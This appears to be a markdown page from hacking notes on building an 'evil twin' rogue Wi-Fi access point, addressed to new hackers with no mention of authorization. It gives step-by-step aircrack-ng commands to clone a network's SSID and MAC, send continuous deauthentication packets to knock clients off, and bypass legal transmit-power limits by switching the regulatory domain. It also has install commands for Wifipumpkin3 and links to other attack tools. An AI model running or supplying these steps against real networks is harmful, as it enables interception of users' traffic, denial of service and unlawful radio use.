# Evil Twin

Our first task will be to creating an evil twin access point. Many new hackers are anxious to crack Wi-Fi passwords to gain some free bandwidth (don't worry, we'll get to that), but there are so many other Wi-Fi hacks that are far more powerful and put so much more at risk than a bit of bandwidth.

## What's an Evil Twin AP?

The evil twin AP is an access point that looks and acts just like a legitimate AP (using the same SSID) and entices the end-user to connect to our access point. Our aircrack-ng suite has a tool, airbase-ng, that can be used to convert our wireless adapter into an access point. This is a powerful client-side hack that will enable us to see all of the traffic from the client and conduct a man-in-the middle attack.

Many corporate offices, hotels, coffee shops, etc. employ this type of security.

## Aircrack-ng Suite

Start `airmon-ng`.

```
# airmon-ng start wlan0
```

Start `airodump-ng` then wait for SSID to display.

```
# airodump-ng mon0
```

Create new AP with same SSID and mac.

```
# airbase-ng -a <bssid> --essid <ssid> -c <channel> mon0
```

Deauth your target

```
# aireplay-ng --deauth 0 -a <bssid>
```

Run your AP at max power (27 is max 'legal' power)

```
# iwconfig wlan0 txpower 27
```

Bypass restrictions is by setting to another domain/country then wait for connection

```
# iw reg set BO

# iwconfig wlan0 txpower 30
```

## EAPHammer

## Wifiphisher

TODO: Provide more usage coverage for Wifiphisher with use cases

## Wifipumpkin

TODO: Provide more usage coverage for Wifipumpkin with use cases

```
$ sudo apt install wifipumpkin3
```

```
$ sudo apt install python3.7-dev libssl-dev libffi-dev build-essential python3.7
```

```
$ git clone https://github.com/P0cL4bs/wifipumpkin3.git && \
cd wifipumpkin3 && sudo make install
```

---
## References

### Source Repositories

- [eaphammer](https://github.com/s0lst1c3/eaphammer)

- [wifiphisher](https://github.com/wifiphisher/wifiphisher)

- [Wifipumpkin](https://github.com/P0cL4bs/wifipumpkin3)

- [koutto: Pi-PwnBox-RogueAP](https://github.com/koutto/pi-pwnbox-rogueap)

### Wifipumpkin

- [Wifipumpkin3 Documentation](https://wifipumpkin3.github.io/docs/getting-started)

### Hacktricks

- [Hacktricks: Pentesting Wi-Fi](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-wifi/index.html

### Black Hills Information Security

- [Black Hills Information Security: How to Install and Perform Wi-Fi Attacks with Wifiphisher](https://www.blackhillsinfosec.com/how-to-install-and-perform-wi-fi-attacks-with-wifiphisher/)

### Penetration Testing Tools

- [Penetration Testing Tools: How to create a Rogue Access Point (connected to the Internet through Tor)](https://miloserdov.org/?p=1591)